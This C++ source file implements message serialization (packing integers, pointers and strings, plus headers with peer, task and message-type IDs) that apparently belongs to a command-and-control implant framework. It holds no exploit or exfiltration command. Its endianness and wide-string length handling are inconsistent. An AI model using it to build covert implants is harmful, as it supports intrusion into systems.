#include <core/include/stream.hpp>
namespace Stream {

    VOID PackInt64 (uint8_t *buffer, uint64_t value) {

        buffer[7] = value & 0xFF; value >>= 8;
        buffer[6] = value & 0xFF; value >>= 8;
        buffer[5] = value & 0xFF; value >>= 8;
        buffer[4] = value & 0xFF; value >>= 8;
        buffer[3] = value & 0xFF; value >>= 8;
        buffer[2] = value & 0xFF; value >>= 8;
        buffer[1] = value & 0xFF; value >>= 8;
        buffer[0] = value & 0xFF;
    }

    VOID PackInt32 (uint8_t *buffer, uint32_t value) {

        buffer[0] = (value >> 24) & 0xFF;
        buffer[1] = (value >> 16) & 0xFF;
        buffer[2] = (value >> 8) & 0xFF;
        buffer[3] = (value) & 0xFF;
    }

    UINT32 ExtractU32 (uint8_t const *buffer) {
        return buffer[0] | (buffer[1] << 8) | (buffer[2] << 16) | (buffer[3] <<24);
    }

    _stream * CreateStreamWithHeaders(uint32_t msg_type) {

        HEXANE
        _stream *stream = CreateStream();

        Stream::PackDword(stream, Ctx->Session.PeerId);
        Stream::PackDword(stream, Ctx->Session.CurrentTaskId);
        Stream::PackDword(stream, msg_type);

        return stream;
    }

    _stream* CreateStream () {
        HEXANE

        _stream *stream = { };
        if (
            !(stream            = S_CAST(_stream *, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, sizeof(_stream)))) ||
            !(stream->Buffer    = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, sizeof(uint8_t)))) {
            return_defer(ntstatus);
        }

        stream->Length 	= 0;
        stream->Next 	= nullptr;

        defer:
        return stream;
    }

    VOID Destroystream (_stream *stream) {
        HEXANE

        if (stream) {
            if (stream->Buffer) {

                x_memset(stream->Buffer, 0, stream->Length);
                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, stream->Buffer);

                stream->Buffer  = nullptr;
                stream->PeerId  = 0;
                stream->TaskId  = 0;
                stream->MsgType = 0;
                stream->Length  = 0;
            }

            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, stream);
        }
    }

    VOID PackByte (_stream *stream, uint8_t data) {
        HEXANE

        if (stream) {
            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(uint8_t));

            x_memcpy(B_PTR(stream->Buffer) + stream->Length, &data, sizeof(uint8_t));
            stream->Length += sizeof(uint8_t);
        }
    }

    VOID PackDword64 (_stream *stream, uint64_t data) {
        HEXANE

        if (stream) {
            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(uint64_t));

            PackInt64(B_PTR(stream->Buffer) + stream->Length, data);
            stream->Length += sizeof(uint64_t);
        }
    }

    VOID PackDword (_stream *stream, uint32_t data) {
        HEXANE

        if (stream) {
            stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + sizeof(uint32_t));

            PackInt32(B_PTR(stream->Buffer) + stream->Length, data);
            stream->Length += sizeof(uint32_t);
        }
    }

    VOID PackBytes (_stream *stream, uint8_t *data, size_t size) {
        HEXANE

        if (stream) {
            if (size) {
                PackDword(stream, S_CAST(uint32_t, size));
                stream->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, stream->Buffer, stream->Length + size);

                x_memcpy(S_CAST(PBYTE, stream->Buffer) + stream->Length, data, size);
                stream->Length += size;
            }
        }
    }

    VOID PackPointer (_stream *stream, void *pointer) {
#ifdef _M_X64
        PackDword64(stream, R_CAST(uintptr_t, pointer));
#elif _M_IX86
        PackDword(stream, S_CAST(uintptr_t, pointer));
#endif
    }

   VOID PackString (_stream *stream, char* data) {
        PackBytes(stream, R_CAST(uint8_t*, data), x_strlen(data));
    }

    VOID PackWString (_stream *stream, wchar_t* data) {
        PackBytes(stream, R_CAST(uint8_t*, data), x_wcslen(data));
    }
}

